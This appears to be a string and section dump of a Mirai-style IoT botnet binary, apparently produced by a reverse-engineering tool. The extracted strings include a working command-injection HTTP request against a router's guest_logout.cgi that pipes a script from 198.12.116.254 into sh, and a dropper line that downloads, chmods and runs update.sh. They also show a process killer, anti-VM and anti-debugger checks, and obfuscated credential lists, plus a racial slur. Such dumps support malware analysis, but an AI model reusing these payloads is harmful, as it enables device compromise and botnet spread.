[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000      0x0 0x00000000      0x0 ---- 
1   0x000000f4     0x14 0x000100f4     0x14 -r-- .interp
2   0x00000108    0x328 0x00010108    0x328 -r-- .hash
3   0x00000430    0x670 0x00010430    0x670 -r-- .dynsym
4   0x00000aa0    0x2c4 0x00010aa0    0x2c4 -r-- .dynstr
5   0x00000d64      0xc 0x00010d64      0xc -r-- .rela.dyn
6   0x00000d70    0x48c 0x00010d70    0x48c -r-- .rela.plt
7   0x000011fc     0x1c 0x000111fc     0x1c -r-x .init
8   0x00001218  0x16498 0x00011218  0x16498 -r-x .text
9   0x000176b0     0x14 0x000276b0     0x14 -r-x .fini
10  0x000176c8   0x4008 0x000276c8   0x4008 -r-- .rodata
11  0x0001b6d0      0x4 0x0002b6d0      0x4 -r-- .eh_frame
12  0x0001c000      0x8 0x0003c000      0x8 -rw- .ctors
13  0x0001c008      0x8 0x0003c008      0x8 -rw- .dtors
14  0x0001c010      0x4 0x0003c010      0x4 -rw- .jcr
15  0x0001c014     0xb0 0x0003c014     0xb0 -rw- .dynamic
16  0x0001c0c4      0x4 0x0003c0c4      0x4 -rw- .got
17  0x0001c0c8    0x4c0 0x0003c0c8    0x4c0 -rwx .plt
18  0x0001c588    0x820 0x0003c588    0x820 -rw- .data
19  0x0001cda8      0x0 0x0003cda8   0x4468 -rw- .bss
20  0x0001cda8     0x48 0x00000000     0x48 ---- .comment
21  0x0001cdf0     0x20 0x00000000     0x20 ---- .debug_aranges
22  0x0001ce10     0x1f 0x00000000     0x1f ---- .debug_pubnames
23  0x0001ce2f    0x16e 0x00000000    0x16e ---- .debug_info
24  0x0001cf9d     0xfb 0x00000000     0xfb ---- .debug_abbrev
25  0x0001d098     0x7c 0x00000000     0x7c ---- .debug_line
26  0x0001d114     0x28 0x00000000     0x28 ---- .debug_frame
27  0x0001d13c    0x10b 0x00000000    0x10b ---- .debug_str
28  0x0001d247     0x6e 0x00000000     0x6e ---- .debug_loc
29  0x0001d2b5     0x18 0x00000000     0x18 ---- .debug_ranges
30  0x0001d2cd    0x11c 0x00000000    0x11c ---- .shstrtab
31  0x0001d914   0x1680 0x00000000   0x1680 ---- .symtab
32  0x0001ef94    0xd2d 0x00000000    0xd2d ---- .strtab

[Segments]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000034     0xc0 0x00010034     0xc0 -r-x PHDR
1   0x000000f4     0x14 0x000100f4     0x14 -r-- INTERP
2   0x00000000  0x1b6d4 0x00010000  0x1b6d4 -r-x LOAD0
3   0x0001c000    0xda8 0x0003c000   0x5210 -rwx LOAD1
4   0x0001c014     0xb0 0x0003c014     0xb0 -rw- DYNAMIC
5   0x00000000      0x0 0x00000000      0x0 -rw- GNU_STACK
6   0x00000000     0x34 0x00010000     0x34 -rw- ehdr

[Entrypoints]
vaddr=0x0001130c paddr=0x0000130c haddr=0x00000018 hvaddr=0x00010018 type=program
185 0x00018fa7 0x00028fa7 6   8    .rodata utf8  'ϗP4\e^ blocks=Basic Latin,Greek and Coptic
186 0x00018fc2 0x00028fc2 4   6    .rodata utf8  ܼFB4 blocks=Syriac,Basic Latin
187 0x00018fff 0x00028fff 7   11   .rodata utf8  'ϗP4\eιԠ blocks=Basic Latin,Greek and Coptic,Cyrillic Supplement
188 0x0001900d 0x0002900d 4   5    .rodata ascii <QB4
189 0x0001901e 0x0002901e 7   8    .rodata ascii *B4F"<<
190 0x0001902e 0x0002902e 4   5    .rodata ascii <QwQ
191 0x0001903b 0x0002903b 6   8    .rodata utf8  4\eLðb\ blocks=Basic Latin,Latin-1 Supplement
192 0x00019057 0x00029057 6   8    .rodata utf8  'ϗP4\eb blocks=Basic Latin,Greek and Coptic
193 0x0001906d 0x0002906d 5   6    .rodata ascii 9Q<4b
194 0x00019074 0x00029074 8   9    .rodata ascii 4\tF4^B4Q
195 0x000190af 0x000290af 6   8    .rodata utf8  'ϗP4\ew blocks=Basic Latin,Greek and Coptic
196 0x000190c8 0x000290c8 4   6    .rodata utf8  4ٰ4* blocks=Basic Latin,Arabic
197 0x000190ef 0x000290ef 6   8    .rodata utf8  'ϗP4\e^ blocks=Basic Latin,Greek and Coptic
198 0x00019137 0x00029137 6   8    .rodata utf8  'ϗP4\ew blocks=Basic Latin,Greek and Coptic
199 0x00019150 0x00029150 4   6    .rodata utf8  4ٰ4* blocks=Basic Latin,Arabic
200 0x00019192 0x00029192 5   8    .rodata utf8  P4\eιԠ blocks=Basic Latin,Greek and Coptic,Cyrillic Supplement
201 0x0001919d 0x0002919d 7   8    .rodata ascii <QB4bFh
202 0x000191a8 0x000291a8 4   5    .rodata ascii PB4w
203 0x000191b2 0x000291b2 4   6    .rodata utf8  4ٰ4* blocks=Basic Latin,Arabic
204 0x000191b8 0x000291b8 6   7    .rodata ascii PB4b"h
205 0x000191c0 0x000291c0 4   5    .rodata ascii B4F\
206 0x000191da 0x000291da 6   7    .rodata ascii GB4bQa
207 0x000191ff 0x000291ff 6   8    .rodata utf8  'ϗP4\ew blocks=Basic Latin,Greek and Coptic
208 0x0001921b 0x0002921b 4   5    .rodata ascii PB4F
209 0x00019257 0x00029257 6   8    .rodata utf8  'ϗP4\e^ blocks=Basic Latin,Greek and Coptic
210 0x0001926e 0x0002926e 4   5    .rodata ascii *B4Q
211 0x00019273 0x00029273 4   6    .rodata utf8  ܼFB4 blocks=Syriac,Basic Latin
212 0x00019291 0x00029291 5   7    .rodata utf8  G4א<Q blocks=Basic Latin,Hebrew
213 0x000192a7 0x000292a7 5   7    .rodata utf8  'ϗP4\e blocks=Basic Latin,Greek and Coptic
214 0x000192cf 0x000292cf 6   8    .rodata utf8  'ϗP4\e^ blocks=Basic Latin,Greek and Coptic
215 0x000192e4 0x000292e4 4   5    .rodata ascii *oB4
216 0x0001932f 0x0002932f 6   8    .rodata utf8  'ϗP4\ew blocks=Basic Latin,Greek and Coptic
217 0x0001933c 0x0002933c 4   6    .rodata utf8  4ٰ4* blocks=Basic Latin,Arabic
218 0x00019343 0x00029343 7   8    .rodata ascii B4w\tw*o
219 0x0001934b 0x0002934b 4   5    .rodata ascii 4Fx"
220 0x00019361 0x00029361 4   5    .rodata ascii QZ'P
221 0x00019368 0x00029368 5   6    .rodata ascii close
222 0x00019370 0x00029370 10  11   .rodata ascii keep-alive
223 0x00019380 0x00029380 6   7    .rodata ascii accept
224 0x00019398 0x00029398 42  43   .rodata ascii %s %s HTTP/1.1\r\nConnection: %s\r\n%s: %s\r\n\r\n
225 0x00019408 0x00029408 7   8    .rodata ascii http://
226 0x00019410 0x00029410 4   5    .rodata ascii 1;t=
227 0x00019418 0x00029418 5   6    .rodata ascii 74tw!
228 0x00019420 0x00029420 87  88   .rodata ascii GET /%s HTTP/1.1\r\n%s-%s: download\r\nHost: %s:80\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n
229 0x00019480 0x00029480 4   5    .rodata ascii \r\n\r\n
230 0x00019b3f 0x00029b3f 63  64   .rodata ascii O0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
231 0x00019baa 0x00029baa 7   8    .rodata ascii \a\b\t\n\v\f\r
232 0x00019bf3 0x00029bf3 19  20   .rodata ascii example.ulfheim.net
233 0x00019c70 0x00029c70 4   5    .rodata ascii %s%s
234 0x00019c83 0x00029c83 6   7    .rodata ascii google
235 0x00019c98 0x00029c98 4   5    .rodata ascii %s%s
236 0x00019ca7 0x00029ca7 4   5    .rodata ascii live
237 0x00019cb8 0x00029cb8 4   5    .rodata ascii %s%s
238 0x00019cc7 0x00029cc7 6   7    .rodata ascii office
239 0x00019cd8 0x00029cd8 4   5    .rodata ascii %s%s
240 0x00019ce6 0x00029ce6 9   10   .rodata ascii \bdigikala
241 0x00019d00 0x00029d00 4   5    .rodata ascii %s%s
242 0x00019d0e 0x00029d0e 11  12   .rodata ascii \nsalesforce
243 0x00019d28 0x00029d28 4   5    .rodata ascii %s%s
244 0x00019d37 0x00029d37 5   6    .rodata ascii sogou
245 0x00019d48 0x00029d48 4   5    .rodata ascii %s%s
246 0x00019d56 0x00029d56 8   9    .rodata ascii \adiscord
247 0x00019d68 0x00029d68 4   5    .rodata ascii %s%s
248 0x00019d76 0x00029d76 8   9    .rodata ascii \awikihow
249 0x00019d88 0x00029d88 4   5    .rodata ascii %s%s
250 0x00019d97 0x00029d97 14  15   .rodata ascii manoramaonline
251 0x00019e60 0x00029e60 4   6    .rodata utf8  #9Qφ blocks=Basic Latin,Greek and Coptic
252 0x00019e70 0x00029e70 6   7    .rodata ascii PPPPPP
253 0x00019ea8 0x00029ea8 8   9    .rodata ascii PPPPPPPP
254 0x00019ee3 0x00029ee3 4   5    .rodata ascii <9Qx
255 0x0001a051 0x0002a051 4   5    .rodata ascii eQ<<
256 0x0001a090 0x0002a090 4   5    .rodata ascii ogin
257 0x0001a098 0x0002a098 5   6    .rodata ascii enter
258 0x0001a0a0 0x0002a0a0 7   8    .rodata ascii assword
259 0x0001a0af 0x0002a0af 14  15   .rodata ascii \a\b\t:;<=>?@\n\v\f\r
260 0x0001a0c0 0x0002a0c0 88  89   .rodata ascii 6861692072616E736F6D6520697473206D6520686F70652075206C69656B206D79206E657720626F746E6574
261 0x0001a177 0x0002a177 4   5    .rodata ascii *oGo
262 0x0001a19d 0x0002a19d 4   5    .rodata ascii oo*o
263 0x0001a200 0x0002a200 5   6    .rodata ascii *oG*G
264 0x0001a218 0x0002a218 5   6    .rodata ascii *oG*G
265 0x0001a222 0x0002a222 5   6    .rodata ascii GPGP*
266 0x0001a385 0x0002a385 5   6    .rodata ascii P**GP
267 0x0001a3a4 0x0002a3a4 5   6    .rodata ascii *G*G*
268 0x0001a3d2 0x0002a3d2 7   8    .rodata ascii *GGo***
269 0x0001a442 0x0002a442 7   8    .rodata ascii Go*o***
270 0x0001a45a 0x0002a45a 7   8    .rodata ascii *oGP***
271 0x0001a474 0x0002a474 5   6    .rodata ascii GP***
272 0x0001a48a 0x0002a48a 9   10   .rodata ascii GoGoGP***
273 0x0001a4ac 0x0002a4ac 6   8    .rodata utf8  *φP*** blocks=Basic Latin,Greek and Coptic
274 0x0001a552 0x0002a552 4   7    .rodata utf8  Go⤆P blocks=Basic Latin,Supplemental Arrows-B
275 0x0001a5a6 0x0002a5a6 5   6    .rodata ascii oGoGo
276 0x0001a5d6 0x0002a5d6 5   6    .rodata ascii GP*GG
277 0x0001a5f6 0x0002a5f6 4   6    .rodata utf8  *͆P* blocks=Basic Latin,Combining Diacritical Marks
278 0x0001a628 0x0002a628 4   5    .rodata ascii %s%s
279 0x0001a630 0x0002a630 8   9    .rodata ascii /net/tcp
280 0x0001a670 0x0002a670 13  14   .rodata ascii /lib/systemd/
281 0x0001a680 0x0002a680 16  17   .rodata ascii /usr/lib/systemd
282 0x0001a698 0x0002a698 19  20   .rodata ascii /system/system/bin/
283 0x0001a6b0 0x0002a6b0 8   9    .rodata ascii /gm/bin/
284 0x0001a6c0 0x0002a6c0 9   10   .rodata ascii /mnt/mtd/
285 0x0001a6d0 0x0002a6d0 10  11   .rodata ascii /usr/sbin/
286 0x0001a6e0 0x0002a6e0 8   9    .rodata ascii /z/zbin/
287 0x0001a6f0 0x0002a6f0 8   9    .rodata ascii /usr/bin
288 0x0001a700 0x0002a700 6   7    .rodata ascii /sbin/
289 0x0001a708 0x0002a708 5   6    .rodata ascii /bin/
290 0x0001a710 0x0002a710 5   6    .rodata ascii /sys/
291 0x0001a718 0x0002a718 8   9    .rodata ascii /system/
292 0x0001a728 0x0002a728 14  15   .rodata ascii /root/dvr_gui/
293 0x0001a738 0x0002a738 14  15   .rodata ascii /root/dvr_app/
294 0x0001a748 0x0002a748 10  11   .rodata ascii /anko-app/
295 0x0001a758 0x0002a758 5   6    .rodata ascii /mnt/
296 0x0001a760 0x0002a760 5   6    .rodata ascii /opt/
297 0x0001a768 0x0002a768 5   6    .rodata ascii /dvr/
298 0x0001a770 0x0002a770 9   10   .rodata ascii /z/zwave/
299 0x0001a780 0x0002a780 9   10   .rodata ascii /z/secom/
300 0x0001a790 0x0002a790 9   10   .rodata ascii SELF_NAME
301 0x0001a7a0 0x0002a7a0 12  13   .rodata ascii IObeENwjmips
302 0x0001a7b0 0x0002a7b0 12  13   .rodata ascii IObeENwjmpsl
303 0x0001a7c0 0x0002a7c0 11  12   .rodata ascii IObeENwjarm
304 0x0001a7d0 0x0002a7d0 12  13   .rodata ascii IObeENwjarm4
305 0x0001a7e0 0x0002a7e0 12  13   .rodata ascii IObeENwjarm5
306 0x0001a7f0 0x0002a7f0 12  13   .rodata ascii IObeENwjarm6
307 0x0001a800 0x0002a800 12  13   .rodata ascii IObeENwjarm7
308 0x0001a810 0x0002a810 11  12   .rodata ascii upnp_server
309 0x0001a820 0x0002a820 11  12   .rodata ascii IObeENwjx86
310 0x0001a830 0x0002a830 9   10   .rodata ascii  cloudrop
311 0x0001a840 0x0002a840 5   6    .rodata ascii cloud
312 0x0001a848 0x0002a848 4   5    .rodata ascii html
313 0x0001a850 0x0002a850 5   6    .rodata ascii /wget
314 0x0001a858 0x0002a858 5   6    .rodata ascii /curl
315 0x0001a860 0x0002a860 5   6    .rodata ascii /tftp
316 0x0001a868 0x0002a868 5   6    .rodata ascii /htop
317 0x0001a870 0x0002a870 4   5    .rodata ascii /top
318 0x0001a878 0x0002a878 5   6    .rodata ascii /grep
319 0x0001a888 0x0002a888 5   6    .rodata ascii /lsof
320 0x0001a890 0x0002a890 7   8    .rodata ascii /ptrace
321 0x0001a898 0x0002a898 7   8    .rodata ascii /strace
322 0x0001a8a0 0x0002a8a0 8   9    .rodata ascii /netstat
323 0x0001a8b0 0x0002a8b0 9   10   .rodata ascii /iptables
324 0x0001a8c0 0x0002a8c0 29  30   .rodata ascii [killer] killing: %s pid: %s\n
325 0x0001a8e0 0x0002a8e0 6   7    .rodata ascii 2surf2
326 0x0001a8e8 0x0002a8e8 4   5    .rodata ascii 2h{h
327 0x0001a8f0 0x0002a8f0 16  17   .rodata ascii TEL %s:%d %s:%s\n
328 0x0001a908 0x0002a908 4   5    .rodata ascii PMMV
329 0x0001a910 0x0002a910 5   6    .rodata ascii CFOKL
330 0x0001a920 0x0002a920 5   6    .rodata ascii TKXZT
331 0x0001a930 0x0002a930 7   8    .rodata ascii ZOJFKRA
332 0x0001a938 0x0002a938 7   8    .rodata ascii FGDCWNV
333 0x0001a940 0x0002a940 8   9    .rodata ascii HWCLVGAJ
334 0x0001a960 0x0002a960 7   8    .rodata ascii QWRRMPV
335 0x0001a970 0x0002a970 8   9    .rodata ascii RCQQUMPF
336 0x0001a988 0x0002a988 4   5    .rodata ascii WQGP
337 0x0001a990 0x0002a990 4   5    .rodata ascii RCQQ
338 0x0001a998 0x0002a998 5   6    .rodata ascii CFOKL
339 0x0001a9b0 0x0002a9b0 8   9    .rodata ascii QOACFOKL
340 0x0001a9d0 0x0002a9d0 13  14   .rodata ascii cFOKLKQVPCVMP
341 0x0001a9e0 0x0002a9e0 6   7    .rodata ascii OGKLQO
342 0x0001a9f0 0x0002a9f0 6   7    .rodata ascii RW@NKA
343 0x0001a9f8 0x0002a9f8 7   8    .rodata ascii QGPTKAG
344 0x0001aa00 0x0002aa00 10  11   .rodata ascii QWRGPTKQMP
345 0x0001aa10 0x0002aa10 5   6    .rodata ascii EWGQV
346 0x0001aa18 0x0002aa18 5   6    .rodata ascii CFOKL
347 0x0001aa20 0x0002aa20 13  14   .rodata ascii CFOKLKQVPCVMP
348 0x0001aa30 0x0002aa30 4   5    .rodata ascii W@LV
349 0x0001aa50 0x0002aa50 5   6    .rodata ascii HT@XF
350 0x0001aa58 0x0002aa58 4   5    .rodata ascii CLIM
351 0x0001aa60 0x0002aa60 5   6    .rodata ascii XNZZ\f
352 0x0001aa68 0x0002aa68 8   9    .rodata ascii AJCLEGOG
353 0x0001aa79 0x0002aa79 5   6    .rodata ascii WHoIM
354 0x0001aa7f 0x0002aa7f 5   6    .rodata ascii TKXZT
355 0x0001aa89 0x0002aa89 5   6    .rodata ascii WHoIM
356 0x0001aa8f 0x0002aa8f 5   6    .rodata ascii CFOKL
357 0x0001aa98 0x0002aa98 6   7    .rodata ascii Q[QVGO
358 0x0001aaa0 0x0002aaa0 4   5    .rodata ascii KIU@
359 0x0001aaa8 0x0002aaa8 8   9    .rodata ascii FPGCO@MZ
360 0x0001aab8 0x0002aab8 7   8    .rodata ascii PGCNVGI
361 0x0001aae0 0x0002aae0 5   6    .rodata ascii CFOKL
362 0x0001aaf0 0x0002aaf0 4   5    .rodata ascii VGAJ
363 0x0001aaf8 0x0002aaf8 8   9    .rodata ascii \e\e\e\e\e\e\e\e
364 0x0001ab08 0x0002ab08 5   6    .rodata ascii oGKLQ
365 0x0001ab30 0x0002ab30 6   7    .rodata ascii WVQVCP
366 0x0001ab38 0x0002ab38 8   9    .rodata ascii XMMOCFQN
367 0x0001ab48 0x0002ab48 5   6    .rodata ascii CFOKL
368 0x0001ab68 0x0002ab68 6   7    .rodata ascii @KLVGA
369 0x0001ab70 0x0002ab70 7   8    .rodata ascii VQWLCOK
370 0x0001ab88 0x0002ab88 6   7    .rodata ascii Q[LLGV
371 0x0001ab90 0x0002ab90 8   9    .rodata ascii @C[CLFQN
372 0x0001aba0 0x0002aba0 5   6    .rodata ascii SWQGP
373 0x0001abb8 0x0002abb8 7   8    .rodata ascii oCLCEGP
374 0x0001abc8 0x0002abc8 7   8    .rodata ascii OCLCEGP
375 0x0001abd0 0x0002abd0 6   7    .rodata ascii DPKGLF
376 0x0001abe0 0x0002abe0 7   8    .rodata ascii MGNKLWZ
377 0x0001abf0 0x0002abf0 4   5    .rodata ascii VKLK
378 0x0001abf8 0x0002abf8 6   7    .rodata ascii CQAGLF
379 0x0001ac02 0x0002ac02 4   5    .rodata ascii nKLI
380 0x0001ac08 0x0002ac08 5   6    .rodata ascii FNKLI
381 0x0001ac10 0x0002ac10 5   6    .rodata ascii NMEKL
382 0x0001ac19 0x0002ac19 4   5    .rodata ascii PMMV
383 0x0001ac20 0x0002ac20 8   9    .rodata ascii AC@NGAMO
384 0x0001ac30 0x0002ac30 6   7    .rodata ascii PMWVGP
385 0x0001ac38 0x0002ac38 7   8    .rodata ascii LGVMRKC
386 0x0001ac40 0x0002ac40 6   7    .rodata ascii Q[QCFO
387 0x0001ac48 0x0002ac48 7   8    .rodata ascii CLKAWQV
388 0x0001ac50 0x0002ac50 5   6    .rodata ascii FG@WE
389 0x0001ac58 0x0002ac58 9   10   .rodata ascii F\fG\f@\fW\fE
390 0x0001ac68 0x0002ac68 4   5    .rodata ascii GAJM
391 0x0001ac70 0x0002ac70 4   5    .rodata ascii FKCE
392 0x0001ac78 0x0002ac78 6   7    .rodata ascii QUKVAJ
393 0x0001ac88 0x0002ac88 6   7    .rodata ascii VGNLGV
394 0x0001aca0 0x0002aca0 4   5    .rodata ascii VMMP
395 0x0001aca8 0x0002aca8 6   7    .rodata ascii ACNTKL
396 0x0001acb4 0x0002acb4 4   5    .rodata ascii SUGP
397 0x0001acc0 0x0002acc0 4   5    .rodata ascii PMMV
398 0x0001acc8 0x0002acc8 7   8    .rodata ascii CJGVXKR
399 0x0001acf8 0x0002acf8 4   5    .rodata ascii pmmv
400 0x0001ad00 0x0002ad00 6   7    .rodata ascii CNRKLG
401 0x0001ad08 0x0002ad08 5   6    .rodata ascii XVG\eZ
402 0x0001ad14 0x0002ad14 4   5    .rodata ascii PMMV
403 0x0001ad20 0x0002ad20 8   9    .rodata ascii rcqqumpf
404 0x0001ad30 0x0002ad30 5   6    .rodata ascii cfokl
405 0x0001ad38 0x0002ad38 7   8    .rodata ascii LGVEGCP
406 0x0001ad50 0x0002ad50 6   7    .rodata ascii T[CVVC
407 0x0001ad58 0x0002ad58 5   6    .rodata ascii cFOKL
408 0x0001ad68 0x0002ad68 6   7    .rodata ascii OKAPMQ
409 0x0001ad70 0x0002ad70 5   6    .rodata ascii QGVWR
410 0x0001ad78 0x0002ad78 7   8    .rodata ascii AMOACQV
411 0x0001ad98 0x0002ad98 4   5    .rodata ascii w`lv
412 0x0001ada0 0x0002ada0 6   7    .rodata ascii LGVOCL
413 0x0001ada8 0x0002ada8 5   6    .rodata ascii Cfokl
414 0x0001adb0 0x0002adb0 6   7    .rodata ascii FCGOML
415 0x0001adb8 0x0002adb8 4   5    .rodata ascii FGOM
416 0x0001adc0 0x0002adc0 5   6    .rodata ascii CPPKQ
417 0x0001adc8 0x0002adc8 7   8    .rodata ascii nKLIQ[Q
418 0x0001add0 0x0002add0 6   7    .rodata ascii ANKGLV
419 0x0001add8 0x0002add8 5   6    .rodata ascii AKQAM
420 0x0001ade0 0x0002ade0 5   6    .rodata ascii akqam
421 0x0001ade8 0x0002ade8 5   6    .rodata ascii QWRGP
422 0x0001adf0 0x0002adf0 4   5    .rodata ascii QWPV
423 0x0001ae00 0x0002ae00 4   5    .rodata ascii CFQN
424 0x0001ae08 0x0002ae08 4   5    .rodata ascii CFQN
425 0x0001ae18 0x0002ae18 6   7    .rodata ascii RCVPMN
426 0x0001ae28 0x0002ae28 6   7    .rodata ascii OGPNKL
427 0x0001ae30 0x0002ae30 8   9    .rodata ascii LGVCFOKL
428 0x0001ae40 0x0002ae40 8   9    .rodata ascii JGUNRCAI
429 0x0001ae50 0x0002ae50 6   7    .rodata ascii lGVkaQ
430 0x0001ae58 0x0002ae58 4   5    .rodata ascii @@QF
431 0x0001ae5d 0x0002ae5d 6   7    .rodata ascii ANKGLV
432 0x0001ae68 0x0002ae68 4   5    .rodata ascii lwnn
433 0x0001ae70 0x0002ae70 8   9    .rodata ascii CFOKLVVF
434 0x0001ae80 0x0002ae80 8   9    .rodata ascii MRGPCVMP
435 0x0001ae90 0x0002ae90 8   9    .rodata ascii rNAOqRkR
436 0x0001aeb0 0x0002aeb0 8   9    .rodata ascii QGAWPKV[
437 0x0001aec0 0x0002aec0 8   9    .rodata ascii OMWLVQ[Q
438 0x0001aed0 0x0002aed0 7   8    .rodata ascii OGOMVGA
439 0x0001aed8 0x0002aed8 5   6    .rodata ascii nqKW{
440 0x0001aede 0x0002aede 5   6    .rodata ascii RmOxe
441 0x0001aee9 0x0002aee9 4   5    .rodata ascii whwJ
442 0x0001aeee 0x0002aeee 8   9    .rodata ascii tGOgDwVG
443 0x0001aef8 0x0002aef8 9   10   .rodata ascii OWQGCFOKL
444 0x0001af08 0x0002af08 4   5    .rodata ascii oWQG
445 0x0001af0d 0x0002af0d 5   6    .rodata ascii cFOKL
446 0x0001af18 0x0002af18 9   10   .rodata ascii QVMPUCVAJ
447 0x0001af28 0x0002af28 10  11   .rodata ascii QRGAKCNKQV
448 0x0001af38 0x0002af38 9   10   .rodata ascii CFOKLRNFV
449 0x0001af48 0x0002af48 9   10   .rodata ascii RNFVCFOKL
450 0x0001af58 0x0002af58 8   9    .rodata ascii AJCLEGOG
451 0x0001af68 0x0002af68 12  13   .rodata ascii VGNGAMOCFOKL
452 0x0001af78 0x0002af78 12  13   .rodata ascii CFOKLVGNGAMO
453 0x0001af88 0x0002af88 6   7    .rodata ascii EWGQV"
454 0x0001af98 0x0002af98 8   9    .rodata ascii FGDCWNV"
455 0x0001afa8 0x0002afa8 7   8    .rodata ascii CLVQNS"
456 0x0001afb0 0x0002afb0 11  12   .rodata ascii QWRGPTKQMP"
457 0x0001afc0 0x0002afc0 4   5    .rodata ascii X[CF
458 0x0001afd0 0x0002afd0 5   6    .rodata ascii PMMV"
459 0x0001afd8 0x0002afd8 6   7    .rodata ascii enable
460 0x0001afe0 0x0002afe0 6   7    .rodata ascii system
461 0x0001afe8 0x0002afe8 5   6    .rodata ascii shell
462 0x0001aff8 0x0002aff8 30  31   .rodata ascii echo -e "\x65\x6e\x65\x6d\x79"
463 0x0001b018 0x0002b018 5   6    .rodata ascii enemy
464 0x0001b020 0x0002b020 11  12   .rodata ascii %d.%d.%d.%d
465 0x0001b030 0x0002b030 385 386  .rodata ascii POST /guest_logout.cgi HTTP/1.1\nHost: %s:80\nUser-Agent: Mozilla/5.0\nContent-Length: 193\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\nConnection: close\n\ncmac=12%%3Aaf%%3Aaa%%3Abb%%3Acc%%3Add&submit_button=status_guestnet.asp%%0Awget+http%%3A%%2F%%2F198.12.116.254%%2Fupdate.sh+-O-+%%7C+sh%%0Aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%%10%%A6G%%00&cip=192.168.100.1
466 0x0001b1b8 0x0002b1b8 7   8    .rodata ascii /status
467 0x0001b1c0 0x0002b1c0 260 261  .rodata ascii cd /tmp || cd /home/$USER || cd /var/run || cd /mnt || cd /data || cd /root || cd /; wget http://%s/update.sh -O update.sh; busybox wget http://%s/update.sh -O update.sh; curl http://%s/update.sh -O update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.sh
468 0x0001b2c8 0x0002b2c8 26  27   .rodata ascii    |-Destination IP   : %s
469 0x0001b2e8 0x0002b2e8 26  27   .rodata ascii    |-Destination Port : %u
470 0x0001b308 0x0002b308 26  27   .rodata ascii    |-Source IP        : %s
471 0x0001b328 0x0002b328 26  27   .rodata ascii    |-Source Port      : %u
472 0x0001b348 0x0002b348 26  27   .rodata ascii    |-TCP Packet count : %d
473 0x0001b368 0x0002b368 20  21   .rodata ascii \n   /-Data Payload-\
474 0x0001b388 0x0002b388 20  21   .rodata ascii    \-Data Payload-/\n
475 0x0001b3a0 0x0002b3a0 8   9    .rodata ascii ~-6mvgmv
476 0x0001b3b0 0x0002b3b0 5   6    .rodata ascii TCPON
477 0x0001b3b8 0x0002b3b8 6   7    .rodata ascii TCPOFF
478 0x0001b3d8 0x0002b3d8 4   5    .rodata ascii ecc|
479 0x0001b3e0 0x0002b3e0 4   5    .rodata ascii ej~-
480 0x0001b3e8 0x0002b3e8 4   5    .rodata ascii 51,U
481 0x0001b408 0x0002b408 7   8    .rodata ascii 6D7,,mv
482 0x0001b428 0x0002b428 10  11   .rodata ascii .~7DU,1v6m
483 0x0001b438 0x0002b438 4   5    .rodata ascii 6cj|
484 0x0001b448 0x0002b448 4   5    .rodata ascii ADNS
485 0x0001b450 0x0002b450 5   6    .rodata ascii SPARC
486 0x0001b458 0x0002b458 61  62   .rodata ascii Determined we already have a instance running on this system!
487 0x0001b498 0x0002b498 44  45   .rodata ascii Binded and listening on address %d.%d.%d.%d\n
488 0x0001b4d0 0x0002b4d0 6   7    .rodata ascii /%s/%s
489 0x0001b4d8 0x0002b4d8 4   5    .rodata ascii /%s/
490 0x0001b4e0 0x0002b4e0 7   8    .rodata ascii %s.root
491 0x0001b4f0 0x0002b4f0 45  46   .rodata ascii [hide_maps] execve failed with error code %d\n
492 0x0001b520 0x0002b520 29  30   .rodata ascii [hide_maps] fork finished...\r
493 0x0001b540 0x0002b540 7   8    .rodata ascii vmware-
494 0x0001b548 0x0002b548 4   5    .rodata ascii vbox
495 0x0001b550 0x0002b550 6   7    .rodata ascii nigger
496 0x0001b558 0x0002b558 7   8    .rodata ascii Richard
497 0x0001b568 0x0002b568 4   5    .rodata ascii qemu
498 0x0001b570 0x0002b570 12  13   .rodata ascii /proc/%u/exe
499 0x0001b588 0x0002b588 4   5    .rodata ascii lldb
500 0x0001b590 0x0002b590 6   7    .rodata ascii strace
501 0x0001b598 0x0002b598 6   7    .rodata ascii ltrace
502 0x0001b5a0 0x0002b5a0 53  54   .rodata ascii perror: EWOULDBLOCK\nSegmentation fault (core dumped)\n
503 0x0001b5d8 0x0002b5d8 5   6    .rodata ascii LINES
504 0x0001b5e0 0x0002b5e0 7   8    .rodata ascii COLUMNS
